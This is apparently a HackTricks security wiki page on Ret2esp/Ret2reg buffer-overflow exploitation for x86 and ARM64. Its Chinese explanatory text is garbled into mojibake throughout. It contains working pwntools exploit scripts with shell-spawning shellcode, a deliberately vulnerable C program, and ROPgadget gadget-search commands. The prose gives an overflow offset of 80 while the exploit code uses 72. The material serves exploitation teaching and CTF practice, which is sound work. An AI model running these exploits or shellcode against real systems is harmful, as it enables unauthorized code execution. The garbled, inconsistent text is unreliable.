# Ret2esp / Ret2reg

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹ AWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹ GCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **Ret2esp**

**ç”±äºESPï¼ˆå †æ ˆæŒ‡é’ˆï¼‰å§‹ç»ˆæŒ‡å‘å †æ ˆçš„é¡¶éƒ¨**ï¼Œè¿™ç§æŠ€æœ¯æ¶‰åŠå°†EIPï¼ˆæŒ‡ä»¤æŒ‡é’ˆï¼‰æ›¿æ¢ä¸º**`jmp esp`**æˆ–**`call esp`**æŒ‡ä»¤çš„åœ°å€ã€‚é€šè¿‡è¿™æ ·åšï¼Œshellcode å°±è¢«æ”¾ç½®åœ¨è¢«è¦†ç›–çš„ EIP ä¹‹åã€‚å½“`ret`æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼ŒESP æŒ‡å‘ä¸‹ä¸€ä¸ªåœ°å€ï¼Œæ°å¥½æ˜¯ shellcode å­˜å‚¨çš„ä½ç½®ã€‚

å¦‚æœåœ¨ Windows æˆ– Linux ä¸­æœªå¯ç”¨**åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰**ï¼Œå¯ä»¥ä½¿ç”¨åœ¨å…±äº«åº“ä¸­æ‰¾åˆ°çš„`jmp esp`æˆ–`call esp`æŒ‡ä»¤ã€‚ç„¶è€Œï¼Œå¦‚æœå¯ç”¨äº†[**ASLR**](../common-binary-protections-and-bypasses/aslr/)ï¼Œå¯èƒ½éœ€è¦åœ¨å—å½±å“çš„ç¨‹åºå†…éƒ¨å¯»æ‰¾è¿™äº›æŒ‡ä»¤ï¼ˆå¹¶ä¸”å¯èƒ½éœ€è¦ç»•è¿‡[**PIE**](../common-binary-protections-and-bypasses/pie/)ï¼‰ã€‚

æ­¤å¤–ï¼Œèƒ½å¤Ÿå°† shellcode æ”¾ç½®åœ¨**EIP è¢«ç ´åä¹‹å**ï¼Œè€Œä¸æ˜¯åœ¨å †æ ˆçš„ä¸­é—´ï¼Œç¡®ä¿åœ¨å‡½æ•°è¿è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œçš„ä»»ä½•`push`æˆ–`pop`æŒ‡ä»¤ä¸ä¼šå¹²æ‰° shellcodeã€‚å¦‚æœ shellcode æ”¾ç½®åœ¨å‡½æ•°å †æ ˆçš„ä¸­é—´ï¼Œå¯èƒ½ä¼šå‘ç”Ÿè¿™ç§å¹²æ‰°ã€‚

### ç©ºé—´ä¸è¶³

å¦‚æœåœ¨è¦†ç›– RIP åç¼ºå°‘å†™å…¥ç©ºé—´ï¼ˆå¯èƒ½åªæœ‰å‡ ä¸ªå­—èŠ‚ï¼‰ï¼Œå¯ä»¥ç¼–å†™ä¸€ä¸ªåˆå§‹çš„**`jmp`** shellcodeï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```armasm
sub rsp, 0x30
jmp rsp
```
### ä¾‹å­

æ‚¨å¯ä»¥åœ¨[https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)ä¸­æ‰¾åˆ°æ­¤æŠ€æœ¯çš„ç¤ºä¾‹ï¼Œæœ€ç»ˆåˆ©ç”¨å¦‚ä¸‹ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
ä½ å¯ä»¥åœ¨[https://guyinatuxedo.github.io/17-stack\_pivot/xctf16\_b0verflow/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/xctf16\_b0verflow/index.html)ä¸­çœ‹åˆ°è¿™ç§æŠ€æœ¯çš„å¦ä¸€ä¸ªç¤ºä¾‹ã€‚åœ¨æ²¡æœ‰å¯ç”¨NXçš„æƒ…å†µä¸‹å‘ç”Ÿäº†ç¼“å†²åŒºæº¢å‡ºï¼Œä½¿ç”¨äº†ä¸€ä¸ªå°å·¥å…·æ¥**å‡å°‘`$esp`çš„åœ°å€**ï¼Œç„¶åä½¿ç”¨`jmp esp;`è·³è½¬åˆ°shellcodeï¼š
```python
# From https://guyinatuxedo.github.io/17-stack_pivot/xctf16_b0verflow/index.html
from pwn import *

# Establish the target process
target = process('./b0verflow')
#gdb.attach(target, gdbscript = 'b *0x080485a0')

# The shellcode we will use
# I did not write this, it is from: http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Establish our rop gadgets

# 0x08048504 : jmp esp
jmpEsp = p32(0x08048504)

# 0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
pivot = p32(0x80484fd)

# Make the payload

payload = ""
payload += jmpEsp # Our jmp esp gadget
payload += shellcode # Our shellcode
payload += "1"*(0x20 - len(shellcode)) # Filler between end of shellcode and saved return address
payload += pivot # Our pivot gadget

# Send our payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()
```
## Ret2reg

ç±»ä¼¼åœ°ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªå‡½æ•°è¿”å›å­˜å‚¨shellcodeçš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨**`call eax`**æˆ–**`jmp eax`**æŒ‡ä»¤ï¼ˆç§°ä¸º**ret2eax**æŠ€æœ¯ï¼‰ï¼Œæä¾›å¦ä¸€ç§æ‰§è¡Œæˆ‘ä»¬çš„shellcodeçš„æ–¹æ³•ã€‚å°±åƒeaxä¸€æ ·ï¼ŒåŒ…å«æœ‰è¶£åœ°å€çš„**ä»»ä½•å…¶ä»–å¯„å­˜å™¨**éƒ½å¯ä»¥è¢«ä½¿ç”¨ï¼ˆ**ret2reg**ï¼‰ã€‚

### ç¤ºä¾‹

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€äº›ç¤ºä¾‹:&#x20;

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)
* [https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c)
* **`strcpy`**å°†å­˜å‚¨åœ¨**`eax`**ä¸­ï¼Œå…¶ä¸­åŒ…å«shellcodeçš„ç¼“å†²åŒºçš„åœ°å€ï¼Œè€Œ**`eax`**æ²¡æœ‰è¢«è¦†ç›–ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨`ret2eax`ã€‚

## ARM64

### Ret2sp

åœ¨ARM64ä¸­ï¼Œ**æ²¡æœ‰**å…è®¸**è·³è½¬åˆ°SPå¯„å­˜å™¨**çš„æŒ‡ä»¤ã€‚å¯èƒ½ä¼šæ‰¾åˆ°ä¸€ä¸ª**å°†spç§»åŠ¨åˆ°å¯„å­˜å™¨ç„¶åè·³è½¬åˆ°è¯¥å¯„å­˜å™¨**çš„gadgetï¼Œä½†åœ¨æˆ‘çš„kali libcä¸­æ‰¾ä¸åˆ°ç±»ä¼¼çš„gadget:
```bash
for i in `seq 1 30`; do
ROPgadget --binary /usr/lib/aarch64-linux-gnu/libc.so.6 | grep -Ei "[mov|add] x${i}, sp.* ; b[a-z]* x${i}( |$)";
done
```
{% endcode %}

æˆ‘å‘ç°çš„å”¯ä¸€æ–¹æ³•æ˜¯æ›´æ”¹åœ¨è·³è½¬åˆ° sp å¤åˆ¶ä¹‹å‰çš„å¯„å­˜å™¨å€¼çš„æ–¹æ³•ï¼ˆå› æ­¤å®ƒå°†å˜å¾—æ— ç”¨ï¼‰ï¼š

<figure><img src="../../.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

### Ret2reg

å¦‚æœä¸€ä¸ªå¯„å­˜å™¨æœ‰ä¸€ä¸ªæœ‰è¶£çš„åœ°å€ï¼Œåªéœ€æ‰¾åˆ°é€‚å½“çš„æŒ‡ä»¤å°±å¯ä»¥è·³è½¬åˆ°å®ƒã€‚æ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹çš„å†…å®¹ï¼š
```bash
ROPgadget --binary /usr/lib/aarch64-linux-gnu/libc.so.6 | grep -Ei " b[a-z]* x[0-9][0-9]?";
```
{% endcode %}

åœ¨ARM64ä¸­ï¼Œæ˜¯**`x0`**å­˜å‚¨å‡½æ•°çš„è¿”å›å€¼ï¼Œå› æ­¤å¯èƒ½æ˜¯x0å­˜å‚¨ç”¨æˆ·æ§åˆ¶çš„ç¼“å†²åŒºçš„åœ°å€ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªç”¨äºæ‰§è¡Œçš„shellcodeã€‚

ç¤ºä¾‹ä»£ç :
```c
// clang -o ret2x0 ret2x0.c -no-pie -fno-stack-protector -Wno-format-security -z execstack

#include <stdio.h>
#include <string.h>

void do_stuff(int do_arg){
if (do_arg == 1)
__asm__("br x0");
return;
}

char* vulnerable_function() {
char buffer[64];
fgets(buffer, sizeof(buffer)*3, stdin);
return buffer;
}

int main(int argc, char **argv) {
char* b = vulnerable_function();
do_stuff(2)
return 0;
}
```
æ£€æŸ¥å‡½æ•°çš„åæ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°**ç¼“å†²åŒºçš„åœ°å€**ï¼ˆå®¹æ˜“å—åˆ°ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Œ**ç”±ç”¨æˆ·æ§åˆ¶**ï¼‰åœ¨ä»ç¼“å†²åŒºæº¢å‡ºè¿”å›ä¹‹å‰è¢«**å­˜å‚¨åœ¨ `x0`** ä¸­ï¼š

<figure><img src="../../.gitbook/assets/image (1225).png" alt="" width="563"><figcaption></figcaption></figure>

åœ¨**`do_stuff`**å‡½æ•°ä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ°**`br x0`**è¿™ä¸ªç‰¹æ®ŠæŒ‡ä»¤ï¼š

<figure><img src="../../.gitbook/assets/image (1226).png" alt="" width="563"><figcaption></figcaption></figure>

æˆ‘ä»¬å°†ä½¿ç”¨è¯¥ç‰¹æ®ŠæŒ‡ä»¤è¿›è¡Œè·³è½¬ï¼Œå› ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯**æ²¡æœ‰å¯ç”¨ PIE ç¼–è¯‘**çš„ã€‚é€šè¿‡æ¨¡å¼åŒ¹é…ï¼Œå¯ä»¥çœ‹åˆ°**ç¼“å†²åŒºæº¢å‡ºçš„åç§»é‡ä¸º 80**ï¼Œå› æ­¤åˆ©ç”¨å°†æ˜¯ï¼š
```python
from pwn import *

p = process('./ret2x0')
elf = context.binary = ELF('./ret2x0')

stack_offset = 72
shellcode = asm(shellcraft.sh())
br_x0 = p64(0x4006a0) # Addr of: br x0;
payload = shellcode + b"A" * (stack_offset - len(shellcode)) + br_x0

p.sendline(payload)
p.interactive()
```
{% hint style="warning" %}
å¦‚æœä½¿ç”¨çš„æ˜¯ **`read`** è€Œä¸æ˜¯ `fgets`ï¼Œåªéœ€è¦†ç›–è¿”å›åœ°å€çš„æœ€å2ä¸ªå­—èŠ‚å³å¯ç»•è¿‡ PIEï¼Œè¿”å›åˆ° `br x0;` æŒ‡ä»¤ï¼Œè€Œæ— éœ€çŸ¥é“å®Œæ•´åœ°å€ã€‚\
ç”±äº `fgets` ä¼šåœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªç©ºå­—ç¬¦ (0x00)ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•ä¸èµ·ä½œç”¨ã€‚
{% endhint %}

## ä¿æŠ¤æœºåˆ¶

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): å¦‚æœæ ˆä¸å¯æ‰§è¡Œï¼Œè¿™ä¸ä¼šèµ·ä½œç”¨ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦å°† shellcode æ”¾åœ¨æ ˆä¸­å¹¶è·³è½¬æ‰§è¡Œå®ƒã€‚
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): è¿™äº›ä¿æŠ¤æœºåˆ¶ä¼šä½¿æ‰¾åˆ°è·³è½¬åˆ° esp æˆ–å…¶ä»–å¯„å­˜å™¨çš„æŒ‡ä»¤å˜å¾—æ›´åŠ å›°éš¾ã€‚

## å‚è€ƒèµ„æ–™

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹  AWS Hackingï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
